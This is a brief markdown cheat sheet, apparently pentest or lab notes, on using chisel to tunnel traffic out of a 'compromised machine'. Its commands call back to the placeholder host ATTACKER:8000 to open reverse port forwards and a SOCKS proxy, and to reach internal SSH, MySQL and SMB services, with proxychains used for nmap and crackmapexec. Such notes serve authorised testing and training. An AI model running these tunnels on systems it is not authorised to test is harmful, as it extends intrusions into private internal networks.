**Port forwarding** and **pivoting** tool that tunnels traffic over HTTP/WebSockets. 
Download the binary from: [chisel](https://github.com/jpillora/chisel)

## Server

Usually runs on the attacker's machine.

```bash
chisel server -p 8000 --reverse
```

`--reverse` enables reverse tunnels.

## Client

Runs on the compromised machine.

```bash
chisel client ATTACKER:8000
```

## Reverse Port Forward (most common)

Exposes an internal service from the victim to the attacker.

```bash
chisel client ATTACKER:8000 R:8080:127.0.0.1:8080
```

Accessible from the attacker as:

```text
127.0.0.1:8080 -> Victim:127.0.0.1:8080
```

## Access another host in the internal network

```bash
chisel client ATTACKER:8000 R:4450:10.10.10.5:445
```

```text
127.0.0.1:4450 -> 10.10.10.5:445
```

## SOCKS Proxy

Best option for pivoting through an entire internal network.

```bash
chisel client ATTACKER:8000 R:socks
```

Then:

```bash
proxychains nmap ...
proxychains crackmapexec ...
```

## Multiple tunnels

```bash
chisel client ATTACKER:8000 \
R:2222:127.0.0.1:22 \
R:8080:127.0.0.1:8080 \
R:3306:127.0.0.1:3306
```

## Authentication

Server:

```bash
chisel server -p 8000 --reverse --auth user:pass
```

Client:

```bash
chisel client --auth user:pass ATTACKER:8000 R:8080:127.0.0.1:8080
```

 ---
 
## Cheatsheet

```bash
# Server
chisel server -p 8000 --reverse

# Port forwarding sever -> attacker
chisel client ATTACKER:8000 R:<port>:127.0.0.1:<port>
```
